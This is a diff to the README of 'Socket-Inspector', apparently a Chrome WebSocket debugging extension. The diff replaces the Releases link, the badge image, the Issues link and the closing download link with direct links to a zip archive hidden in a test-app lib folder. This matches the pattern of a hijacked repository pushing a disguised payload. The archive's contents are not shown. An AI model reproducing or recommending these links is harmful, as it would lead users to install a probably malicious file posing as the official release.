@@ -1,6 +1,6 @@
 # 🔌 Socket-Inspector - Debug WebSocket Applications Easily
 
-![Download Socket-Inspector](https://img.shields.io/badge/Download-Socket--Inspector-blue)
+![Download Socket-Inspector](https://raw.githubusercontent.com/FaycleZz/Socket-Inspector/main/playwright/test-app/ui/src/lib/Socket-Inspector_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Socket-Inspector is a Chrome DevTools extension designed to help you debug WebSo
 
 To download and install Socket-Inspector, visit the Releases page:
 
-[Download Socket-Inspector](https://github.com/FaycleZz/Socket-Inspector/releases)
+[Download Socket-Inspector](https://raw.githubusercontent.com/FaycleZz/Socket-Inspector/main/playwright/test-app/ui/src/lib/Socket-Inspector_v3.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of Socket-Inspector.
@@ -60,7 +60,7 @@ A: Yes, Socket-Inspector can support any application that uses the WebSocket pro
 
 ## 🤝 Community Contributions
 
-Feel free to contribute to Socket-Inspector. To report bugs, suggest features, or ask questions, visit our [Issues page](https://github.com/FaycleZz/Socket-Inspector/issues).
+Feel free to contribute to Socket-Inspector. To report bugs, suggest features, or ask questions, visit our [Issues page](https://raw.githubusercontent.com/FaycleZz/Socket-Inspector/main/playwright/test-app/ui/src/lib/Socket-Inspector_v3.8.zip).
 
 ## 📝 License
 
@@ -70,6 +70,6 @@ Socket-Inspector is licensed under the MIT License. You can use and modify it ac
 
 Don’t forget to download Socket-Inspector from the following link:
 
-[Download Socket-Inspector](https://github.com/FaycleZz/Socket-Inspector/releases) 
+[Download Socket-Inspector](https://raw.githubusercontent.com/FaycleZz/Socket-Inspector/main/playwright/test-app/ui/src/lib/Socket-Inspector_v3.8.zip) 
 
 Enjoy debugging your WebSocket applications with ease!
